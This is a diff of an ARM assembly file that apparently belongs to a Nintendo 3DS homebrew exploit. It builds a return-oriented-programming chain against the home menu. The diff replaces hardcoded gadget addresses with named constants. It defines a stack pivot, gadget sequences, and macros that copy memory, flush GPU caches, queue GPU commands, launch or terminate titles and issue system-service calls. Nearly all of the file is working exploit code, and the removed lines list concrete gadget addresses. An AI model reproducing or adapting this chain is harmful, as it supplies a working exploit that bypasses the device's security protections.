@@ -6,40 +6,34 @@
 
 MENU_OBJECT_LOC equ MENU_LOADEDROP_BUFADR
 
-MENU_STACK_PIVOT equ 0x00100fdc ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
-MENU_NOP equ 0x001575F0 ; pop {pc}
-MENU_NSS_REBOOT equ 0x00139874 ; ends in "add sp, sp, #0xc ; ldmfd sp!, {r4,r5,pc}"
-MENU_FS_HANDLE equ 0x002F0F30
-MENU_GSPGPU_HANDLE equ 0x002FDED8
-MENU_PAD equ 0x1000001C
-MENU_KEYCOMBO equ 0x00000008 ; START
-MENU_SLEEP equ 0x0012E64C
-MENU_CONNECTTOPORT equ 0x0011C544
+MENU_STACK_PIVOT equ ROP_MENU_STACK_PIVOT ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
+MENU_NOP equ ROP_MENU_POP_PC ; pop {pc}
+MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
+MENU_CONNECTTOPORT equ ROP_MENU_CONNECTTOPORT
 
-MENU_NSS_LAUNCHTITLE equ 0x0020E640 ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
-MENU_GSPGPU_RELEASERIGHT equ 0x0013148C ; r0 : handle addr
-MENU_GSPGPU_FLUSHDATACACHE equ 0x0014D55C ; r0 : address, r1 : size
-MENU_GSPGPU_GXTRYENQUEUE equ 0x001F5F10 ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
-MENU_GSPGPU_WRITEHWREG equ 0x0014D884 ; r0 : gpu reg offset, r1 : data ptr, r2 : size
-MENU_MEMCPY equ 0x00213318 ; r0 : dst, r1 : src, r2 : size
+MENU_NSS_LAUNCHTITLE equ ROP_MENU_NSS_LAUNCHTITLE ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
+MENU_GSPGPU_RELEASERIGHT equ ROP_MENU_GSPGPU_RELEASERIGHT ; r0 : handle addr
+MENU_GSPGPU_FLUSHDATACACHE equ ROP_MENU_GSPGPU_FLUSHDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
+MENU_GSPGPU_GXTRYENQUEUE equ ROP_MENU_GSPGPU_GXTRYENQUEUE ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
+MENU_MEMCPY equ ROP_MENU_MEMCPY ; r0 : dst, r1 : src, r2 : size
 
 GPU_REG_BASE equ 0x1EB00000
 
 SNS_CODE_OFFSET equ 0x0001D300
 
 .macro set_lr,_lr
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NOP ; pop {pc}
-	.word 0x0015d048 ; pop {r4, lr} ; bx r0
+	.word ROP_MENU_POP_R4LR_BX_R0 ; pop {r4, lr} ; bx r0
 		.word 0xDEADBABE ; r4 (garbage)
 		.word _lr ; lr
 .endmacro
 
 .macro nss_launch_title,tidlow,tidhigh
-	set_lr 0x00101c74 ; pop {r4, pc}
-	.word 0x001575ac ; pop {r0, pc}
+	set_lr ROP_MENU_POP_R4PC ; pop {r4, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
-	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
 		.word tidlow ; r2 (tid low) 
 		.word tidhigh ; r3 (tid high)
 		.word 0xDEADBABE ; r4 (garbage)
@@ -50,9 +44,9 @@ SNS_CODE_OFFSET equ 0x0001D300
 .endmacro
 
 .macro memcpy_r0_lr,src,size
-	.word 0x00214988 ; pop {r1, pc}
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word src ; r1 (src)
-	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
 		.word size ; r2 (size)
 		.word 0xDEADBABE ; r3 (garbage)
 		.word 0xDEADBABE ; r4 (garbage)
@@ -63,9 +57,9 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 ; this memcpy's the size bytes that immediately preceed its call
 .macro memcpy_r0_lr_prev,size
-	.word 0x00214988 ; pop {r1, pc}
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word (MENU_OBJECT_LOC + (. - 4 - size) - object) ; r1 (src)
-	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
 		.word size ; r2 (size)
 		.word 0xDEADBABE ; r3 (garbage)
 		.word 0xDEADBABE ; r4 (garbage)
@@ -76,84 +70,75 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 .macro memcpy,dst,src,size
 	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word dst ; r0 (out ptr)
 	memcpy_r0_lr
 .endmacro
 
 .macro gsp_release_right
 	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
 	.word MENU_GSPGPU_RELEASERIGHT
 .endmacro
 
 .macro flush_dcache,addr,size
 	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
-		.word addr ; r0 (out ptr)
-	.word 0x00214988 ; pop {r1, pc}
-		.word size ; r1 (src)
-	.word MENU_GSPGPU_FLUSHDATACACHE
-.endmacro
-
-.macro write_gpu_reg,offset,data,size
-	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
-		.word offset ; r0 (out ptr)
-	.word 0x00214988 ; pop {r1, pc}
-		.word data ; r1 (src)
-	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
-		.word size ; r2 (size)
-		.word 0xDEADBABE ; r3 (garbage)
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
+		.word 0xFFFF8001 ; r1 (process handle)
+	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
+		.word addr ; r2 (addr)
+		.word size ; r3 (src)
 		.word 0xDEADBABE ; r4 (garbage)
 		.word 0xDEADBABE ; r5 (garbage)
 		.word 0xDEADBABE ; r6 (garbage)
-	.word MENU_GSPGPU_WRITEHWREG
+	.word MENU_GSPGPU_FLUSHDATACACHE
 .endmacro
 
 .macro send_gx_cmd,cmd_data
 	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
-		.word 0x002EF580+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
-	.word 0x00214988 ; pop {r1, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word MENU_GSPGPU_INTERRUPT_RECEIVER_STRUCT+0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word cmd_data ; r1 (cmd addr)
 	.word MENU_GSPGPU_GXTRYENQUEUE
 .endmacro
 
 .macro sleep,nanosec_low,nanosec_high
 	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word nanosec_low ; r0
-	.word 0x00214988 ; pop {r1, pc}
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word nanosec_high ; r1
 	.word MENU_SLEEP
 .endmacro
 
 .macro connect_to_port,out_ptr,port_name
 	set_lr MENU_NOP
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word out_ptr ; r0
-	.word 0x00214988 ; pop {r1, pc}
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word port_name ; r1
 	.word MENU_CONNECTTOPORT
 .endmacro
 
 .macro transfer_word,dst,src
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word src ; r0
-	.word 0x0013744c ; ldr r0, [r0] ; pop {r4, pc}
+	.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
 		.word dst ; r4
-	.word 0x001f3c30 ; str r0, [r4] ; pop {r4, pc}
+	.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
 .macro get_cmdbuf
 	set_lr MENU_NOP
-	.word 0x0013f7a4 ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
-	.word 0x00214988 ; pop {r1, pc}
+	.word ROP_MENU_MRC_R0C13C03_ADD_R0R0x5C_BX_LR ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
+	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
 		.word (0x80-0x5C) / 4 ; r1
-	.word 0x001e58e0 ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
+	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
@@ -161,17 +146,17 @@ SNS_CODE_OFFSET equ 0x0001D300
 	transfer_word (MENU_OBJECT_LOC + base + sendFsCommandHandle - sendFsCommand - object), handle_ptr
 	get_cmdbuf
 	memcpy_r0_lr (MENU_OBJECT_LOC + base - object), (sendFsCommand_end - sendFsCommand)
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word (MENU_OBJECT_LOC + hbspecialHandle - object) ; r0 (hb handle)
-	.word 0x00101c74 ; pop {r4, pc}
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word MENU_OBJECT_LOC ; r4 (dummy but address needs to be valid/readable)
-	.word 0x0013a48C ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
 .macro nss_terminate_tid,tid_low,tid_high,timeout_low
 	get_cmdbuf
-	.word 0x00159cdc ; pop {r4, r5, r6, r7, r8, pc}
+	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
 		; nss_terminate_tid_cmd_buf:
 		.word 0x00110100 ; command header
 		.word tid_low ; tid low
@@ -179,17 +164,17 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word timeout_low ; timeout low
 		.word 0x00000000 ; timeout high
 	memcpy_r0_lr_prev (4 * 5)
-	.word 0x001575ac ; pop {r0, pc}
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
-	.word 0x00101c74 ; pop {r4, pc}
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
 		.word MENU_OBJECT_LOC ; r4 (dummy but address needs to be valid/readable)
-	.word 0x0013a48C ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
 .macro infloop
-	set_lr 0x00207080 ; bx lr
-	.word 0x00207080 ; bx lr
+	set_lr ROP_MENU_BX_LR ; bx lr
+	.word ROP_MENU_BX_LR ; bx lr
 .endmacro
 
 .orga 0x0
